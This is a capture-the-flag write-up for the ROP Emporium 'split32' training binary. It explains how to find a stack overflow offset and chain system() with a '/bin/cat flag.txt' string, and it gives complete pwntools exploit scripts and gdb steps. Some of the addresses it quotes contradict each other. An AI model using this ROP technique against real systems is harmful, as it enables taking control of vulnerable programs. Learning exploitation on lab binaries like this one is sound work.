# split32

Link: https://ropemporium.com/challenge/split.html

Description: *That useful string "/bin/cat flag.txt" is still present in this binary, as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen.*

--------------------------


## 1. Calculating EIP overwrite offset

First we check if the offset is different than in the previous challenge, "ret2win". It seems it is still 40, with 41 characters we see only one "41" in RIP registry:

## 2. Studying the binary

We can find the system address with objdump, located in "0x08048430" (the address of system in the .plt section):

Next, we need the address of the string "/bin/cat flag.txt". We can do this using GEF, and finding the address is "0x601060":

```
gdb -q ./split32
break main
r
grep "/bin/cat flag.txt"
```

We can find the address of this string with ROPgadget too:

## 3. Calling system("/bin/cat flag.txt")

The idea is concatenating the addresses (system) + (exit) + (command), just like in [here](https://bufferoverflows.net/rop-manual-exploitation-on-x32-linux/)

The problem is that there is not an exit function, so we will look for the instruction *leave*, I will take 0x080484e8:

![a](images/Screenshot_2.jpg)

So now we have the addresses of "system" in .plt section, an instruction for "exiting" and the string with the command, we can make a Python exploit:

```
from pwn import *

context(arch='i386', os='linux')
binary_name = 'split32'

p = process('./'+binary_name)
elf =  ELF(binary_name)

system  = 0x08048430 
command = 0x0804a030 
exit =    0x080484e8
log.info("system %s"  % hex(system))
log.info("command %s" % hex(command))

junk = "A"*44
rop = junk + p32(system) + p32(exit) + p32(command)
p.recvuntil("> ")
p.send(rop)
p.interactive()
```


## 4. Final exploit

The exploit works:

![a](images/Screenshot_6.jpg)

Now we will change the calculation of some addresses making it automatic with Python:

```
system  = elf.sym["system"] #system  = 0x08048430 
command = next(elf.search('/bin/cat flag.txt')) #command = 0x0804a030 
exit =    0x080484e8
junk = "A"*44
rop = junk + p32(system) + p32(exit) + p32(command)
```

And it still works! Final exploit:

```
from pwn import *

context(arch='i386', os='linux')
binary_name = 'split32'

p = process('./'+binary_name)
elf =  ELF(binary_name)

system  = elf.sym["system"] #system  = 0x08048430 
command = next(elf.search('/bin/cat flag.txt')) #command = 0x0804a030 
exit =    0x080484e8
log.info("system %s"  % hex(system))
log.info("command %s" % hex(command))

junk = "A"*44
rop = junk + p32(system) + p32(exit) + p32(command)
p.recvuntil("> ")
p.send(rop)
p.interactive()
```

# Option 2: Only GDB and Python (and a little rabin2)

Find the buffer size with ltrace:

```
ltrace ./split32
```

![img](images2/Screenshot_1.png)

Find the pwnme function:

```
disass main
```

![img](images2/Screenshot_2.png)


Re-check the buffer size is 96 (line +60):

```
disass pwnme
```

![img](images2/Screenshot_3.png)

Check there is an overflow with 120 characters:

![img](images2/Screenshot_4.png)

Offsets are again 44 and 48:

![img](images2/Screenshot_5.png)

Find system() address (0x080483e0) and the interesting function usefulFunction:

![img](images2/Screenshot_6.png)

Disassemble the function and find the address of string "/bin/ls":

![img](images2/Screenshot_7.png)

Execute an attack with the payload 44 "A" + System Address + 4-byte Padding + /bin/ls address + Junk

Get "/bin/cat flag.txt" address:

Re-check with gdb:
